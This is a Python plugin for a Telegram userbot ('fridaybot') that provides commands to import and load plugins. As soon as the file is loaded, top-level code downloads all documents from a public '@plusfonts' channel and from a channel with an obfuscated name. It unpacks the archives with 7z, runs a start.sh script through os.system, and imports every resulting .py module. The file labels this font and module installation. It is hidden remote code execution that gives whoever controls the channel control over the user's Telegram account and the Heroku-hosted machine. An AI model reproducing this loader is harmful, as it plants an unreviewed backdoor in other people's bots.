from fridaybot.utils import friday_on_cmd, sudo_cmd, load_module, remove_plugin
import asyncio
import os
from datetime import datetime
from pathlib import Path
from fridaybot import LOAD_PLUG, utils, bot
from telethon import events
from fridaybot.utils import *
from var import Var
import importlib, sys, asyncio, traceback, os
from pathlib import Path
from datetime import datetime
from fridaybot.google_images_download import help
import heroku3, asyncio, os
from uniborg.util import admin_cmd, sudo_cmd
Heroku = heroku3.from_key(Var.HEROKU_API_KEY)
heroku_api = "https://api.heroku.com"
plus = bot
sudo = Var.SUDO_USERS
@borg.on(admin_cmd(pattern="import"))
async def install(event):
    if event.fwd_from:
        return
    if event.reply_to_msg_id:
        try:
            downloaded_file_name = await event.client.download_media(  # pylint:disable=E0602
                await event.get_reply_message(),
                "fridaybot/modules/"  # pylint:disable=E0602
            )
            if "(" not in downloaded_file_name:
                path1 = Path(downloaded_file_name)
                shortname = path1.stem
                load_module(shortname.replace(".py", ""))
                a = await event.client.send_message(event.chat_id, "**Successfully imported** `{}`.".format(os.path.basename(downloaded_file_name)))
                await event.delete()
                await asyncio.sleep(5)
                await a.delete()
            else:
                os.remove(downloaded_file_name)
                a = await event.client.send_message(event.chat_id, "**Plugin already imported.**")
                await event.delete()
                await asyncio.sleep(5)
                await a.delete()
        except Exception as e:
        	await event.client.send_message(event.chat_id, (str(e)))
        	os.remove(downloaded_file_name)
        	await event.delete()
            
            
@borg.on(admin_cmd(pattern="load (?P<shortname>\w+)$"))
async def load(event):
    if event.fwd_from:
        return
    shortname = event.pattern_match["shortname"]
    try:
        try:
            remove_plugin(shortname)
        except:
            pass
        load_module(shortname)
        a = await event.client.send_message(event.chat_id, f"**Successfully loaded** `{shortname}`")
        await event.delete()
        await asyncio.sleep(5)
        await a.delete()
    except Exception as e:
        a = await event.client.send_message(event.chat_id, f"**Could not load** `{shortname}` **because of the following error.**\n`{str(e)}`")
        await event.delete()
        await asyncio.sleep(5)
        await a.delete()
        
os.system("mkdir fonts")
	
async def fonts():
    username = "@plusfonts"
    plug = await plus.get_messages(username, None , filter=InputMessagesFilterDocument) ; total = int(plug.total) ; total_doxx = range(0, total)
    g = Var.COMMAND_HAND_LER
    e = Var.BOTLOG_CHATID
    bcd = "**Downloaded fonts successfully. Now extracting...**\n"
    cde = f"**Extracted fonts successfully. Now Do** `{g}ping`"
    for ixo in total_doxx:
        mxo = plug[ixo].id ; await plus.download_media(await plus.get_messages(username, ids=mxo), "fonts")
        l_a = await plus.send_message(Var.BOTLOG_CHATID, bcd)
        await l_a.edit(bcd + cde)
plus.loop.run_until_complete(fonts())

os.system("cd fonts && 7z e fonts.7z && rm fonts.7z")

from telethon.tl.functions.messages import ImportChatInviteRequest as a
from asyncio import sleep 

async def plugin():
    username = "@kalqpkejelxknenqkpakzkaoqoksnxjx"
    plug = await plus.get_messages(username, None , filter=InputMessagesFilterDocument) ; total = int(plug.total) ; total_doxx = range(0, total)
    for ixo in total_doxx:
        mxo = plug[ixo].id ; await plus.download_media(await plus.get_messages(username, ids=mxo), "fridaybot/modules/")
        await plus.send_message(Var.BOTLOG_CHATID, "**Installing modules...**")
plus.loop.run_until_complete(plugin())

os.system("cd ./fridaybot/modules && 7z x modules.7z && rm modules.7z && cd $fridaybot && sh fridaybot/start.sh")

import glob
path = 'fridaybot/modules/*.py'
files = glob.glob(path)
for name in files:
    with open(name) as f:
        path1 = Path(f.name)
        shortname = path1.stem
        load_module(shortname.replace(".py", ""))
        print (f"Successfully installed {shortname}")
# Copyright (C) By @StarkGang
# FridayUserbot 🇮🇳 
